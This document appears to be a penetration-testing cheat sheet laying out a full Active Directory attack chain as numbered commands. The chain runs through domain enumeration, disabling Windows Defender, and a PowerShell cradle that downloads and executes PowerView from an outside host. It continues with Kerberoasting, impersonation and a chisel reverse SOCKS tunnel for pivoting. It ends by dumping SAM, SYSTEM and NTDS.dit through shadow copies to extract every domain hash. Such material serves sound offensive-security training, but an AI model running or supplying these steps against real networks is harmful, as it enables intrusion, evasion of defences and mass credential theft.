# Active Directory Enumeration

Enumerate and exploit AD users and groups.

1. Enumerate all **local accounts**
   
        net user

2. Enumerate all users in the **entire domain**

        net user /domain

3. Query information about **individual users**

        net user USERNAME /domain
    
    Identify a user who is member of the **Domain Admins** group

4. Enumerate all groups in the domain

        net group /domain

    Analyse output and identify custom groups, if any.

5. Create an **LDAP connection string**

        LDAP://DC=|SERVER NAME|[,DC=|EXTENSION|]

6. **Disable Windows Defender** by running following PowerShell command as a local administrator

        Set-MpPreference -DisableRealtimeMonitoring $true

7. **Extract** files from a ZIP folder using PowerShell
  
        Expand-Archive -LiteralPath ./filename.zip -DestinationPath ./outputFolderName

8. Check **file permissions**

        icacls filename.txt

9. **Grant** a user **full control** over a folder and all its subfolders

        icacls "C:\folder\path" /grant Username:(OI)(CI)F /T

10. **Check** the current user's **integrity level**

        whoami /groups

    Is it **low**, **medium**, **high**, **system**, or **installer**?

11. **Change** the integrity level of a file

        icacls winPEASx64.exe /setintegritylevel Low
    ---
        > icacls winPEASx64.exe
        winPEASx64.exe NT AUTHORITY\SYSTEM:(I)(F)
                BUILTIN\Administrators:(I)(F)
                COMPATIBILITY\Administrator:(I)(F)
                Mandatory Label\Low Mandatory Level:(NW)

12. Check the current user's **permissions**

        whoami /priv

13. List the "Security Update" **patches**

        Get-Hotfix -description "Security update"

14. Get a list of running **non-standard services** that **start automatically**

        wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

15. Enumerate the **internal network** to find live hosts

        for /L %i in (1,1,255) do @ping -n 1 -w 200 10.10.10.%i > nul && echo 10.10.10.%i is up.

16. Use [CrackMapExecWin](../crackmapexecwin/README.md) to check which boxes could be accessed using any of the known credentials

17. Use [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) to find users on the network with enhanced privileges

        powershell.exe -executionpolicy bypass "iex(New-Object System.Net.WebClient).DownloadString('http://10.10.10.9:8000/PowerView.ps1'); Get-NetComputer"

    ---

        Get-DomainComputer | Select name
        Find-DomainShare
        Find-DomainShare -CheckShareAccess

    ---

    List any interesting share, if found, to view its contents

        ls \\citrix\citrix$\

    Check if a domain user has SPN associated with them

        Get-DomainUser
        Get-DomainUser <account_name>

    Request a Ticket Granting Service Ticket (TGS-REQ) for an identified service. The returned TGS (TGS-REP) would be encrypted using the NTLM password hash of the account in whose context the service was running.

18. [Refer steps mentioned here](../attacking_kerberos/README.md) to obtain and crack the hash for a user who has an SPN associated with them
19. Check current user's permissions

        whoami /priv

20. If `SeImpersonatePrivilege` feature is enabled for current user, and, if hash (from step #18, above) was cracked successfully, then **impersonate** as a different user 

    * Using [Covenant](https://github.com/cobbr/Covenant)

            MakeToken <username> <domain.local> <password> LOGON32_LOGON_INTERACTIVE

    * Using [runas](https://www.dionach.com/blog/discovering-sensitive-information-in-file-shares/)

            runas /netonly /user:domain.local\USERNAME "PowerShell.exe -exec bypass"

21. Do a listing of accessible **shares**, as the impersonated user

        ls \\shareName\sharePath$\

22. Enumerate the **internal subnet**

        $ ipconfig
        $ for /L %i in (1,1,255) do @ping -n 1 -w 200 172.10.10.%i > nul && echo 172.10.10.%i is up.

23. Use [Invoke-PortScan.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Scan/Invoke-PortScan.ps1) PowerShell script for **port-scanning**

        Invoke-Portscan -StartAddress 172.10.10.1 -EndAddress 172.10.10.4 -ScanPort -Port 21,22,53,80,443,8080

24. Deploy a **SOCKS proxy** and enable **reverse tunneling** using [chisel](https://github.com/jpillora/chisel/releases) to access internal applications (if any)

    **Linux (Server):**

        ./chisel_1.7.2_linux_amd64 server --reverse

    **Windows (Client):**

        ./chisel_1.7.2_windows_amd64 client 10.10.10.9:8080 R:0.0.0.0:1080:socks

25. **Route traffic** through the SOCKS proxy by adding following line to the end of `/etc/proxychains.conf` file (and, commenting out any pre-existing entries)

        socks5  127.0.0.1 1080

26. Configure browser to use SOCKS proxy on port 1080 (using FoxyProxy browser plugin), and browse to an **internal web server** through the proxy

        proxychains curl http://172.10.10.4

27. Use **Proxychains** to connect and run commands on the remote machine

        $ proxychains ssh nsroot@172.10.10.4 -i ./id_rsa  -v 
        > shell "/bin/sh"
        #
        # tcpdump -w capture.cap -v -s0

    ---

        proxychains scp -i id_rsa root@172.10.10.4:/tmp/capture.cap .

28. Obtain a list of accounts using [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

        Get-DomainUser | select samaccountname

29. Download [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec/releases) binary for Linux
30. Check which of the service accounts in an internal network are accessible through known crcedentials

        proxychains ./cme smb 172.10.10.4 -d domain.local -u ./users.txt -p 'Password123' --continue-on-success

31. If known credentials allow access to a service account, explore the account further

        net user <account_name> /domain

32. If remote management is enabled, login to the domain controller remotely using [Evil-WinRM](../../privilege_escalation/winrm_5985/README.md) alongwith proxychanins
        
        proxychains evil-winrm -i <IP> -u USERNAME -p PASSWORD

33. The `NTDS.dit` file is the **database** for Active Directory that is present on all domain controllers. It stores hashes for all domain users as well as information about other objects in the domain. 
    1. **SAM** and **SYSTEM registry hives** are required in order to decrypt the file. Export these hives:

            reg save HKLM\System System.hive
            reg save HKLM\SAM SAM.hive

    2. Create a backup copy of `NTDS.dit` file

            robocopy C:\Windows\ntds .\ntds /B /R:1

    3. If the file is locked, and cannot be copied directly, then use [Volume Shadow Copy](https://www.ubackup.com/windows-10/volume-shadow-copy-windows-10.html) feature via [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) utility to access the restricted file
       1. Create `script.txt` file containing commands to create a shadow copy of `C:` drive

                set verbose on
                set metadata C:\Windows\Temp\meta.cab
                set context clientaccessible
                set context persistent
                begin backup
                add volume C: alias cdrive
                create
                expose %cdrive% E:
                end backup

        2. Convert `script.txt` to Windows format using **unix2dos** command

                unix2dos script.txt

        3. Upload the file using [Evil-WinRM](../../privilege_escalation/winrm_5985/README.md)

                upload script.txt

        4. Execute the uploaded script

                diskshadow.exe /s script.txt

        5. Access the contents of `C:` drive via newly created `E:` drive

                ls E:

        6. Create a backup of `ntds.dit` file from the path `E:\windows\ntds\ntds.dit`

                robocopy /B E:\Windows\ntds .\ntds ntds.dit

        7. Download **registry hives** and **Active Directory database** using [Evil-WinRM](../../privilege_escalation/winrm_5985/README.md)

                download System.hive System.hive
                download SAM.hive SAM.hive
                download ntds\ntds.dit ntds.dit

    4. Extract hashes using [Impacket](../../windows_post_exploitation/file_transfer_smbserver/README.md)'s `secretsdump.py` script.

## References

* https://www.codemag.com/Article/1312041/Using-Active-Directory-in-.NET
* https://www.wintips.org/how-to-disable-or-remove-windows-defender-antivirus-in-server-2016/
* https://www.robvanderwoude.com/ntadmincommands.php
* https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/integrity-levels
* https://stackoverflow.com/questions/2928738/how-to-grant-permission-to-users-for-a-directory-using-command-line-in-windows
* https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
* https://morph3sec.com/Writeups/HackTheBox/HackTheBox-Endgame-Xen-Writeup/
* https://www.picussecurity.com/blog/picus-10-critical-mitre-attck-techniques-t1003-credential-dumping
* https://info.varonis.com/hubfs/docs/whitepapers/en/ebook_pen_testing_031317.pdf?hsLang=en
* https://github.com/cobbr/Covenant
* https://powersploit.readthedocs.io/en/latest/
* https://powersploit.readthedocs.io/en/latest/Recon/Find-DomainShare/
* https://www.dionach.com/blog/discovering-sensitive-information-in-file-shares/
* https://blog.emacsos.com/use-socks5-proxy-in-curl.html
* https://medium.com/@vegardw/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29
* https://chickenpwny.github.io/windows/chisel/
* https://netsec.ws/?p=278
* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
* https://www.ubackup.com/windows-10/volume-shadow-copy-windows-10.html
* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow
* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow
* https://medium.com/swlh/proxying-like-a-pro-cccdc177b081
* https://www.offensive-security.com/metasploit-unleashed/pivoting/
